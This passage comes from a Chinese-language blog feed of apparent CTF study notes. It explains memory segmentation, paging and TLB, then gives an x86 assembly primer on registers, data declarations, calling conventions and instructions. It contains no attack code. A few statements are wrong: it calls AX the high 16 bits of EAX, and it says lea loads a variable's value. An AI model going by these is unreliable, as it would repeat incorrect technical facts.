芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="逻辑地址"><a href="#逻辑地址" class="headerlink" title="逻辑地址"></a>逻辑地址</h1><p>逻辑地址，就是指机器语言指令中用来指定一个操作数或一条指令的地址，<strong>由一个段(segment)和偏移量(offset)组成</strong>，说地直白点就是CPU拿到的地址。</p><p>段号：用来查找段的起始地址，它被存储在段寄存器当中</p><p>偏移地址：是存储单元的物理地址与所在起始段的差值</p><h1 id="各种内存的关系"><a href="#各种内存的关系" class="headerlink" title="各种内存的关系"></a>各种内存的关系</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="虚拟地址和物理地址"><a href="#虚拟地址和物理地址" class="headerlink" title="虚拟地址和物理地址"></a>虚拟地址和物理地址</h2><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。</p><p>分段机制下的虚拟地址由两部分组成，<strong>段选择子</strong>和<strong>段内偏移量</strong>。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>段选择子保存在寄存器里。段选择子最重要的是段号，用作段表的索引。段表里保存的是这个段的基地址、段的界限和特权等级等。</p><p>段选择子是十六位的，其中十四位表示地址信息</p><h4 id="段偏移量"><a href="#段偏移量" class="headerlink" title="段偏移量"></a>段偏移量</h4><p>偏移量定义为：把存储单元的<strong>实际地址</strong>与其所在段的<strong>段地址</strong>之间的距离称为段内偏移，也称为“有效地址”或“偏移量”。</p><p>虚拟地址中的段偏移量应该位于0和段界限之间。如果段内偏移量是合法的，就将其段及地址加到段内偏移量得到物理内存地址。</p><p>分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址。</p><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ul><li>内存碎片</li></ul><p>举例来说。假设我们现在占有 1G 的物理内存，用户执行了多个程序，游戏占用了 512MB 内存，浏览器占用了 128MB 内存，音乐占用了 256 MB 内存。</p><p>这个时候，我们关闭浏览器，则空闲内存还有 1024 - 512 - 256 &#x3D; 256MB。但如果这个 256MB 不是连续的，被分成了两段 128 MB 内存，这就会导致没有空间再打开一个 200MB 的程序。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>这里的内存碎片的问题共有两处地方：</p><p>外部内存碎片，也就是产生了多个<strong>不连续</strong>的小物理内存，导致新的程序无法被装载；</p><p>内部内存碎片，程序所有的内存都被装载到了物理内存，但是这个程序有部分的内存可能并不是很常使用，这也会导致<strong>内存的浪费</strong></p><ul><li>内存交换效率低</li></ul><p>对于外部内存碎片的问题，我们采用内存交换的解决措施。</p><p>可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。</p><p>对于多进程的系统来说，用分段的方式，内存碎片是很容易产生的，产生了内存碎片，那不得不重新重新规划内存区域，这个过程会产生性能瓶颈。</p><p>因为硬盘的访问速度要比内存慢太多了，每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上。</p><p>所以，<strong>如果内存交换的时候，交换的是一个占内存空间很大的程序，这样整个机器都会显得卡顿。</strong></p><h3 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h3><p>为了解决内存分段的内存碎片和内存交换效率低的问题，就出现了内存分页。<strong>分页是把整个虚拟和物理内存空间切成一段段固定尺寸的大小</strong>。这样一个连续并且尺寸固定的内存空间，我们叫<strong>页</strong>（<em>Page</em>）</p><p>虚拟地址与物理地址之间通过页表来映射：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>页存储在内存里，由CPU的内存管理单元即MMU负责映射转换的工作吗，这样CPU 就可以直接通过 MMU，找出要实际要访问的物理内存地址。</p><p>由于内存空间都是预先划分好的，也就不会像分段会产生间隙非常小的内存。采用了分页，那么释放的内存都是以页为单位释放的，也就不会产生无法给进程使用的小内存。</p><p>如果内存空间不够，操作系统会把其他正在运行的进程中的「最近没被使用」的内存页面给释放掉，也就是暂时写在硬盘上，称为<strong>换出</strong>（<em>Swap Out</em>）。一旦需要的时候，再加载进来，称为<strong>换入</strong>（<em>Swap In</em>）。所以，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，内存交换的效率就相对比较高。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>在分页机制下，虚拟地址分为两部分，<strong>页号</strong>和<strong>页内偏移</strong>。页号作为页表的索引，<strong>页表</strong>包含物理页每页所在<strong>物理内存的基地址</strong>，这个基地址与页内偏移的组合就形成了物理内存地址</p><h4 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h4><p>再来，为了解决简单分页产生的页表过大的问题，就有了<strong>多级页表</strong>，它解决了空间上的问题，但这就会导致 CPU 在寻址的过程中，需要有很多层表参与，加大了时间上的开销。于是根据程序的<strong>局部性原理</strong>，在 CPU 芯片中加入了 <strong>TLB</strong>，负责缓存最近常被访问的页表项，大大提高了地址的转换速度。</p><hr><p>冲浪冲到的，我觉得比起枯燥的文字，这个更好理解</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>之前觉得自己很牛直接开始做题，靠一些老本还是能做几道题，但最近发现偏移量和内存地址啥的根本不会看也不会算，还是老老实实打基础叭😳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编基础</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bit的x86汇编基础，包括一些常规指令，内存和寻址模式</p><span id="more"></span><p>总觉得学了又好像没学······</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>现代 x86 处理器有 8 个 32 bit 寄存器，如上图所示。</p><p>寄存器名字是早期计算机历史上流传下来的。</p><ul><li>EAX：一般用作累加器(Accumulator)</li><li>EBX：一般用作基址寄存器(Base)</li><li>ECX：一般用来计数(Count)</li><li>EDX：一般用来存放数据(Data)</li><li>ESI：一般用作源变址(Source Index)</li><li>EDI：一般用作目标变址(Destinatin Index)</li><li>ESP：一般用作堆栈指针(Stack Pointer)</li><li>EBP：一般用作基址指针(Base Pointer)</li></ul><p>现在大部分寄存器的名字已经失去了原来的意义，但有两个是例外：<strong>栈指针寄存器（Stack Pointer）ESP 和基址寄存器（ Base Pointer）EBP</strong>。</p><p>对于 <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> 四个寄存器，可以再将 32bit 划分成多个子寄存器， 每个子寄存器有专门的名字。例如 <code>EAX</code> 的高 16bit 叫 <code>AX</code>（去掉 E, 据说E表示 Extended）,低 8bit 叫 <code>AL</code> (Low）, 8-16bit 叫 <code>AH</code> （High）。</p><p>在汇编语言中，这些寄存器的名字是<strong>大小写无关</strong>的，既可以用 <code>EAX</code>，也可以写 <code>eax</code>。</p><h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h3 id="程序重定位"><a href="#程序重定位" class="headerlink" title="程序重定位"></a>程序重定位</h3><ul><li>存放程序的为代码段，存放数据的为数据段</li><li>真实的内存单元地址称为物理地址，而程序中的地址为逻辑地址</li></ul><p>由于程序并不知道自己会被加载到哪，因此访存如果用绝对地址将会出错，在执行程序时就需要<strong>程序重定位</strong>这个操作。</p><p>该操作在汇编中通过<code>org</code>指令实现，如<code>org 0A100h</code>代表该程序中的所有标号都以<code>0A100h</code>做偏移。</p><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>将内存分段后，程序只需要识别偏移地址就可以确定数据位置。程序重定位通过设置代码段CS寄存器和数据段DS寄存器实现。</p><p>在8086中，地址总线是20位的，需要将段寄存器左移4位（<code>0x10h</code>，相当于16进制左移1位）变为20位，然后再同偏移地址相加。</p><p>两种典型情况</p><ul><li>因为段寄存器是16位的，在段不重叠的情况下，最多可以将1MB的内存分成65536个段，每个段16B，偏移地址从<code>0000H</code>到<code>000FH</code></li><li>同样在不允许段之间重叠的情况下，因为偏移地址也是16位，1MB的内存最多只能划分成16个段，每段长64KB，段地址由<code>0000H</code>到<code>F000H</code></li></ul><h3 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h3><p><code>.DATA</code>：声明静态存储区</p><p>数据类型修饰语：</p><p><code>DB/db</code>：Byte,1Byte</p><p><code>DW/dw</code>：Word,2Byte</p><p><code>DD/dd</code>：Double Word,4Bytes</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; 声明一个 byte 值, referred to as location var, containing the value 64.<br>var2    DB ?     ; 声明一个未初始化 byte 值, referred to as location var2.<br>        DB 10    ; 声明一个没有 label 的 byte 值, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; 声明一个 2-byte 未初始化值, referred to as location X.<br>Y       DD 30000 ; 声明一个 4-byte 值, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>在汇编中只有一维数组</strong>，没有二维和多维数组。一维数组其实就是内存中的一块连续区域。<code>DUP</code> 和字符串常量也是声明数组的两种方法。</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; 声明 3 个 4-byte values, 初始化为 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; 声明 10 个 uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; 声明 100 个 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; 声明 6 bytes starting at the address str, 初始化为 hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>有多个指令可以用于内存寻址。如果要访问某一大小的内存，则通过添加修饰词<code>byte</code>、<code>word</code>、<code>dword</code>实现。</p><p>🌰：</p><p>其中<code>MOV</code> 将在内存和寄存器之间移动数据，接受两个参数：第一个参数是目的地，第二个是源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="函数调用-call-堆栈组织"><a href="#函数调用-call-堆栈组织" class="headerlink" title="函数调用(call)堆栈组织"></a>函数调用(call)堆栈组织</h3><h4 id="Caller规则"><a href="#Caller规则" class="headerlink" title="Caller规则"></a>Caller规则</h4><ol><li>在调用函数&#x2F;子程序(subroutine)之前，先保存特定寄存器的状态(caller-saved)（包括<code>eax</code>、<code>ecx</code>、<code>edx</code>）</li><li>将要传的参数堆栈（注意要逆序，<strong>最后一个参数最先入</strong>）。因为栈往下生长，因此第一个参数会被存在最低的地址</li><li>调用函数，<code>call</code>会将返回地址<code>eip</code>压入栈中</li><li>返回时先把参数移出栈，然后将原来保存的寄存器再pop出来</li></ol><h4 id="Callee规则"><a href="#Callee规则" class="headerlink" title="Callee规则"></a>Callee规则</h4><ol><li><p>将<code>ebp</code>推入栈，将<code>esp</code>的值拷贝入<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>分配局部变量，栈由上向下增长，如分配3个4B，则<code>sub esp, 12</code></p></li><li><p>保存寄存器状态</p></li></ol><h1 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h1><p>机器指令通常分为三类：数据移动、算术&#x2F;逻辑和控制流。</p><p>接下来的符号解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; 任何32位寄存器 （EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP）<br>&lt;reg16&gt;; 任何16位寄存器 （AX, BX, CX, or DX）<br>&lt;reg8&gt;; 任何8位寄存器 （AH, BH, CH, DH, AL, BL, CL, or DL）<br>&lt;reg&gt;; 任何寄存器<br>&lt;mem&gt;; 一个内存地址 （e.g., [eax], [var + 4], or dword ptr [eax+ebx]）<br>&lt;con32&gt;; 任何32位常量<br>&lt;con16&gt;; 任何16位常量<br>&lt;con8&gt;; 任何8位常量<br>&lt;con&gt;; 任何8、16、32位常量<br></code></pre></td></tr></table></figure><h2 id="数据移动"><a href="#数据移动" class="headerlink" title="数据移动"></a>数据移动</h2><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov指令将第二操作对象（寄存器、内存内容或是常量值）所引用的数据项复制到其第一操作对象（寄存器或是内存）所引用的位置。</p><p>寄存器到寄存器的移动是合法的，但是直接内存到内存的移动是不合法的。在需要内存传输的情况下，必须首先将源内存中的内容加载到寄存器中，然后才能将其存储到目标内存地址。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; 将EBX中的值复制到EAX<br>mov byte ptr [var], 5 ; 将5存储到地址var的一个字节中<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESP（堆栈指针）通过push递减。</p><p>push指令将其操作对象放在内存中硬件支持堆栈的顶部。具体地说，PUSH首先将ESP递减4，然后将其操作对象放入内存地址[ESP]处的32位大小的区域中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; 将eax入栈<br>push [var] ; 将地址var处开始的4个字节入栈<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>pop指令将4字节数据元素从硬件支持的堆栈顶部移至指定的操作对象（即寄存器或内存位置）。它首先将位于内存位置[SP]的4个字节移动到指定的寄存器或内存位置，然后将SP递增4。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; 将堆栈的顶部元素弹出到EDI中<br>pop [ebx] ; 将堆栈的顶部元素弹出到内存从EBX位置开始的四个字节中<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea指令将其第二个操作对象指定的地址放入其<strong>第一个操作对象指定的寄存器中</strong>。需要注意的是，内存位置的内容不会被加载，并且只有有效地址会被计算并放入寄存器中。这对于获取指向内存区域的指针非常有用。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea &lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; 将地址EBX+4*ESI放入EDI<br>lea eax, [var] ; 将var中的值放在EAX中<br></code></pre></td></tr></table></figure><h2 id="算数和逻辑运算符"><a href="#算数和逻辑运算符" class="headerlink" title="算数和逻辑运算符"></a>算数和逻辑运算符</h2><h4 id="add-整数加法"><a href="#add-整数加法" class="headerlink" title="add-整数加法"></a>add-整数加法</h4><p>add指令将其两个操作对象相加，将结果存储在第一个操作对象中。需要注意的是，虽然两个操作对象都可以是寄存器，<strong>但最多只有一个操作对象可以是内存位置</strong>。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX ← EAX + 10<br>add BYTE PTR [var], 10 ; 将存储在内存地址var的单字节值加上10<br></code></pre></td></tr></table></figure><h4 id="sub-整数减法"><a href="#sub-整数减法" class="headerlink" title="sub-整数减法"></a>sub-整数减法</h4><p>sub指令将其第一个操作对象的值减去第二个对象的值，并将结果存储在第一个对象的内存位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL ← AL - AH<br>sub eax, 216 ; 从存储在EAX中的值中减去216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-递增，递减"><a href="#inc-dec-递增，递减" class="headerlink" title="inc,dec-递增，递减"></a>inc,dec-递增，递减</h4><p>inc指令将其操作对象的内容+1；DEC指令将其操作对象的内容-1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; 从EAX的内容中减去1<br>inc DWORD PTR [var] ; 将存储在位置var的32位整数加1<br></code></pre></td></tr></table></figure><h4 id="imul-整数乘法"><a href="#imul-整数乘法" class="headerlink" title="imul-整数乘法"></a>imul-整数乘法</h4><p>imul指令有两种基本格式：两个操作对象和三个操作对象。</p><p>有两个操作对象时将其两个操作对象相乘，并将结果储存在第一个操作对象当中，其中，第一个对象必须是寄存器。</p><p>有三个操作对象时，将第二个操作对象与第三个操作对象相乘，并将其结果储存在第一个操作对象当中，其中第一个对象必须是寄存器，第三个对象必须是常量值。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; 将EAX的内容乘以内存位置var的32位内容并将结果存储在EAX中<br>imul esi, edi, 25 ; ESI → EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-整数除法"><a href="#idiv-整数除法" class="headerlink" title="idiv-整数除法"></a>idiv-整数除法</h4><p>idiv指令将64位整数<code>EDX:EAX</code>的内容除以指定的操作对象值。结果存储在EAX中，其余数的存储在EDX中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; 将EDX:EAX的内容除以EBX的内容。把商放在EAX中，余放在EDX中<br>idiv DWORD PTR [var] ; 将EDX:EAX的内容除以存储在内存位置var的32位值。把商放在EAX中，余放在EDX中<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-按位与、或和异或"><a href="#and-or-xor-按位与、或和异或" class="headerlink" title="and,or xor-按位与、或和异或"></a>and,or xor-按位与、或和异或</h4><p>这些指令对其操作对象执行指定的位运算（分别为按位与、或和异或），并将结果放在第一个操作对象位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; 清除EAX的除最后4位以外的所有位<br>xor edx, edx ; 将EDX的内容设置为零<br></code></pre></td></tr></table></figure><h4 id="not-按位取反"><a href="#not-按位取反" class="headerlink" title="not-按位取反"></a>not-按位取反</h4><p>not指令触发反转操作对象中的所有位，其结果称为反码。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; 取反内存位置var的字节中的所有位<br></code></pre></td></tr></table></figure><h4 id="neg-求补"><a href="#neg-求补" class="headerlink" title="neg-求补"></a>neg-求补</h4><p>neg是汇编指令中的求补指令，对操作对象执行求补运算：用0减去操作对象，然后结果返回操作对象；或是直接将操作对象按位取反后+1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX → - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-左移，右移"><a href="#shl-shr-左移，右移" class="headerlink" title="shl, shr-左移，右移"></a>shl, shr-左移，右移</h4><p>这些指令将其第一个操作对象内容中的位左右移位，用零填充产生的空位位置。移位后的操作对象最多可以移位31位。要移位的位数由第二个操作对象指定，该操作对象可以是8位常量，也可以是寄存器CL。</p><p>在任一情况下，以32为模执行大于31的移位计数。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; 将EAX的值乘以2（如果最高有效位为0）<br>shr ebx, cl ; 将EBX的值除以2^n^的结果的下限存储在EBX中，其中n是CL中的值<br></code></pre></td></tr></table></figure><h2 id="控制流指令"><a href="#控制流指令" class="headerlink" 